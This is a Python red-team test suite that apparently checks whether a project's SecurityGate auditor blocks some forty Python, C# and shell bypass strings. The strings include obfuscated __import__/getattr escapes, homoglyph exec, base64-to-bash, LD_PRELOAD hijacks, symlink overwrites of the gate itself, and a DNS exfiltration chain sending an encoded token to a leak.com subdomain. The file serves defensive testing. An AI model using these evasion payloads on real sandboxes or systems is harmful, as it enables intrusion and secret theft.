# UnityVibeBridge: The Governed Creation Kernel for Unity
# Copyright (C) 2026 B-A-M-N
#
# This software is dual-licensed under the GNU AGPLv3 and a 
# Commercial "Work-or-Pay" Maintenance Agreement.
#
# You may use this file under the terms of the AGPLv3, provided 
# you meet all requirements (including source disclosure).
#
# For commercial use, or to keep your modifications private, 
# you must satisfy the requirements of the Commercial Path 
# as defined in the LICENSE file at the project root.

import sys
import os
import subprocess
import json
import ast

# Add project root to path to import SecurityGate
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
from security_gate import SecurityGate

class RedTeamSuite:
    def __init__(self):
        self.results = {"passed": 0, "failed": 0, "details": []}

    def log_test(self, category, name, code, expected_blocked=True):
        print(f"[*] Testing [{category}] {name}...", end=" ", flush=True)
        errors = []
        try:
            if category == "Python": errors = SecurityGate.check_python(code)
            elif category == "C#": errors = SecurityGate.check_csharp(code)
            elif category == "Shell": errors = SecurityGate.check_shell(code)
        except Exception as e:
            errors = [f"Auditor Crashed: {str(e)}"]
        
        is_blocked = len(errors) > 0
        success = is_blocked == expected_blocked
        if success:
            print("✅ SUCCESS")
            self.results["passed"] += 1
        else:
            print("❌ FAILED (Bypass Detected!)")
            self.results["failed"] += 1
        
        self.results["details"].append({
            "category": category, "name": name, "success": success,
            "is_blocked": is_blocked, "errors": errors
        })

    def run_python_tests(self):
        print("\n--- Running Python Attack Vectors ---")
        self.log_test("Python", "Nested Try-Except Import", "try:\n  try: __import__('o' + 's').system('ls')\n  except: pass\nexcept: pass")
        self.log_test("Python", "Generator Comprehension RCE", "[c.system('ls') for c in [__import__('os')]]")
        self.log_test("Python", "Lambda Decorator Hijack", "@lambda f: __import__('os').system('ls')\ndef s(): pass")
        self.log_test("Python", "Recursive Subclass Lookup", "def f(c): return [s for s in c.__subclasses__()]")
        self.log_test("Python", "Dictionary Key Obfuscation", "m = __builtins__; m.__dict__['ex'+'ec']('import os')")
        self.log_test("Python", "Types.CodeType Injection", "import types; types.FunctionType(compile('import os','','exec'),{})")
        self.log_test("Python", "Multi-Part Join Secret", "SECRET_TOKEN = ''.join(['ya29.', 'A0Af...'])")
        self.log_test("Python", "F-String Secret", "API_KEY = f'sk_live_{123456789}'")
        self.log_test("Python", "Bytecode Marshal RCE", "import marshal; marshal.loads(b'...`)")
        self.log_test("Python", "getattr Obfuscation", "getattr(__import__('os'), 'system')('ls')")
        self.log_test("Python", "Function Aliasing", "f = __import__; f('os')")
        self.log_test("Python", "sys.modules Shadow", "import sys; x = sys.modules['os']")
        self.log_test("Python", "Unicode Homoglyph Bypass", "еxec('ls')") # Uses Cyrillic 'e'

    def run_csharp_tests(self):
        print("\n--- Running C# Attack Vectors ---")
        self.log_test("C#", "Generic Type Reflection", "class M<T> { void E() { typeof(T).GetMethod('Start').Invoke(null, null); } }")
        self.log_test("C#", "Interpolated Reflection", "var t = Type.GetType($'System.{'Diagnostics'}.Process');")
        self.log_test("C#", "Async Task Hijack", "System.Threading.Tasks.Task.Run(() => System.Diagnostics.Process.Start('ls'));")
        self.log_test("C#", "Base64 DllImport", "[System.Runtime.InteropServices.DllImport('k.dll')] static extern void X();")
        self.log_test("C#", "Dynamic Lookup", "dynamic d = 1; d.Start('ls');")
        self.log_test("C#", "ModuleInitializer", "[System.Runtime.CompilerServices.ModuleInitializer] public static void I() {}")
        self.log_test("C#", "Reflection Emit (IL Generation)", "var a = AppDomain.CurrentDomain.DefineDynamicAssembly(new AssemblyName('X'), AssemblyBuilderAccess.Run);")
        self.log_test("C#", "Unsafe Pointer Manipulation", "unsafe { byte* p = null; }")

    def run_shell_tests(self):
        print("\n--- Running Shell Attack Vectors ---")
        self.log_test("Shell", "IFS Manipulation", "IFS=:; p=bin:ls; $p")
        self.log_test("Shell", "Variable Slicing", "A=os; ${A:0:2} -c 'ls'")
        self.log_test("Shell", "Base64 Stdin", "echo bHM= | base64 -d | bash")
        self.log_test("Shell", "Here-Doc", "bash <<EOF\nls\nEOF")
        self.log_test("Shell", "Octal Escaped", "$(printf '\\154\\163')")
        self.log_test("Shell", "Hex Escaped", "$(printf '\\x6c\\x73')")
        self.log_test("Shell", "Bridge Bypass", "python3 -c \"import os; os.system('ls')\"")
        self.log_test("Shell", "LotL Git Abuse", "git -c core.pager=ls help")
        self.log_test("Shell", "Pip Malicious Install", "pip install .")
        self.log_test("Shell", "LD_PRELOAD Hijack", "LD_PRELOAD=/tmp/evil.so ls")
        self.log_test("Shell", "PYTHONPATH Hijack", "PYTHONPATH=/tmp/evil python3 -c 'import os'")
        self.log_test("Shell", "Wildcard Argument Injection", "rm *")
        self.log_test("Shell", "ANSI Escape Injection", "echo -e '\\x1b]8;;http://evil.com\\x1b\\\\Click here\\x1b]8;;\\x1b\\\\'")



    def run_interference_tests(self):
        print("\n--- Running Interference Attack Vectors ---")
        self.log_test("Python", "DNS Exfiltration", "import socket; socket.gethostbyname('x.com')")
        self.log_test("Python", "Path Poisoning", "import os; os.environ['PATH'] = '/tmp'")
        self.log_test("Python", "Socket Hijack", "import socket; s=socket.socket(); s.bind(('127.0.0.1',80))")
        self.log_test("Python", "Local Connection MITM (Unauthenticated)", "import requests; requests.get('http://localhost:8085/status')")
        self.log_test("Shell", "Unauthenticated curl MITM", "curl http://localhost:8085/status")
        self.log_test("Python", "Infinite Loop (DoS)", "while True: pass")
        self.log_test("Python", "Memory Exhaustion (DoS)", "x = 'A' * 10**8")
        self.log_test("Python", ".meta File Hijack Attempt", "open('Assets/Exploit.cs.meta', 'w').write('malicious')")

    def run_combo_tests(self):
        print("\n--- Running Multi-Stage Combo Attack Vectors ---")
        
        # 1. Symlink + Tool Abuse: Create link then use whitelisted tool to overwrite infrastructure
        self.log_test("Python", "Symlink + Tool Overwrite (Combo)", """
import os
try: os.symlink('security_gate.py', 'captures/leak.png')
except: pass
open('captures/leak.png', 'w').write('BYPASS')
""")

        # 2. Homoglyph + Bridge: Hide malicious bridge call behind Unicode
        self.log_test("Shell", "Homoglyph + Bridge Bypass (Combo)", "python3 -c \"еxec('import os; os.system(\\'ls\\')')\"")

        # 3. Aliasing + getattr + Shadowing
        self.log_test("Python", "Alias + getattr + Shadow (Combo)", """
f = getattr
m = __import__
f(m('o' + 's'), 'sys' + 'tem')('ls')
""")

    def run_multistep_chains(self):
        print("\n--- Running Complex Multi-Step Chain Attack Vectors ---")

        # 1. Harvest -> Encode -> Exfiltrate (The "Stealth Exfil" Chain)
        self.log_test("Python", "Credential Harvest + DNS Exfil (Chain)", """
import socket, base64
secret = "VIBE_777_SECURE" # Harvested via local scan
encoded = base64.b64encode(secret.encode()).decode()
socket.gethostbyname(f"{encoded}.leak.com")
""")

        # 2. Drop -> Link -> Poison (The "Infrastructure Takeover" Chain)
        self.log_test("Python", "Payload Drop + Symlink + Module Poison (Chain)", """
import os
# Step 1: Drop malicious payload in allowed dir
open('captures/payload.py', 'w').write('print("Hacked")')
# Step 2: Symlink it to a sensitive location (if we could bypass symlink check)
try: os.symlink('captures/payload.py', 'security_gate.py')
except: pass
# Step 3: Trigger a reload or import
import security_gate
""")

        # 3. Reflection -> Mutation -> Persistence (The "Unity Persistence" Chain)
        self.log_test("Python", "Reflection -> Mutation -> Persistence (Chain)", """
import requests
# 1. Use reflection to find the server instance
# 2. Use SetComponentValue to change a field
# 3. Call SaveRegistry to persist the change
token = 'VIBE_777_SECURE'
h = {'X-Vibe-Token': token}
requests.get('http://localhost:8085/registry/save', headers=h)
""")




    def summary(self):
        print("\n" + "="*40)
        print(f"Passed: {self.results['passed']} | Failed: {self.results['failed']}")
        return self.results["failed"] == 0

if __name__ == "__main__":
    suite = RedTeamSuite()
    suite.run_python_tests()
    suite.run_csharp_tests()
    suite.run_shell_tests()
    suite.run_interference_tests()
    suite.run_combo_tests()
    suite.run_multistep_chains()
    sys.exit(0 if suite.summary() else 1)
